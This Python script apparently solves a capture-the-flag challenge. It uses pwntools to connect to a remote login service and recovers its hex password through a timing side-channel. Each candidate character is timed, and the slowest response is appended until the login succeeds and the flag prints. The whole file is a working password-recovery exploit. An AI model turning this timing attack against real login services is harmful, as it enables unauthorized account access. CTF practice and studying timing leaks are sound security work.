from pwn import remote
from utils.flag_strings import hex_flag_chars_lower
from time import time

r = remote("timetohack.fword.wtf", 1337)

found = False
# cur_pass = '7c80ee65890' #e'
cur_pass = ''
while not found:
    print("pass =", cur_pass)
    max_time = (0, '')
    times = []
    for c in hex_flag_chars_lower:
        print(c, end='')
        r.recvuntil(">>> ").decode()

        r.sendline('1')

        start = time()
        r.sendline(cur_pass + c)
        assert r.recvline().strip().decode() == "password:"
        resp = r.recvline().strip().decode()
        if resp != "Login Failed.":
            found = True
            print()
            print(cur_pass + c)
            print(resp)
            print(r.recvall(1).decode().strip())
            exit(0)
        end = time()

        time_taken = round(end - start, ndigits=6)
        times.append((time_taken, c))

        max_time = max(max_time, (time_taken, c))
        average = sum([t[0] for t in times]) / len(times)
        if max_time[0] > average + 0.3:
            break

    print()
    times.sort(reverse=True)
    print(times)

    cur_pass += times[0][1]
